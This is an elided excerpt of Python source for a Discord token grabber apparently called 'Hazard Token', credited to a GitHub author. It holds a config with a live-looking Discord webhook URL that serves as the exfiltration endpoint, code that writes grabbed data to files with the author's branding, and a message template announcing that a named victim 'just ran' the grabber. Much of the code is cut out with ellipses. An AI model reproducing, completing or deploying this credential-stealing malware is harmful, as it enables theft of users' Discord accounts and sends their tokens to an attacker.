...
config = {
    ...
    'webhook': "https://discord.com/api/webhooks/982203351934578708/S7SVmZqml_wOXc1lYDZmP63Cto9yUv7TEmItCVZ-eVyJS2MKYzRjuf1nv9Nl0cfmvmTA",
    ...
    def finish(self):
                ...
                with open(path, "r", errors="ignore") as ff:
                    ...
                    if not x:
                        ...
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write("🌟・Grabber By github.com/sh3boot・https://github.com/sh3boot/Hazard-Token-Sh3boot\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(x+"\n\n🌟・Grabber By github.com/sh3boot・https://github.com/sh3boot/Hazard-Token-Sh3boot")
        ...
        embed = {
            ...
            'embeds': [
                {
                    'author': {
                        'name': f'*{Victim}* Just ran Hazard Token sh3boot.V2',
                        'url': 'https://github.com/sh3boot/Hazard-Token-Sh3boot',
                    ...
                    'footer': {
                        'text': '🌟・Grabber By github.com/sh3boot・https://github.com/sh3boot/Hazard-Token-Sh3boot'
                    }
                }
            ]
        }
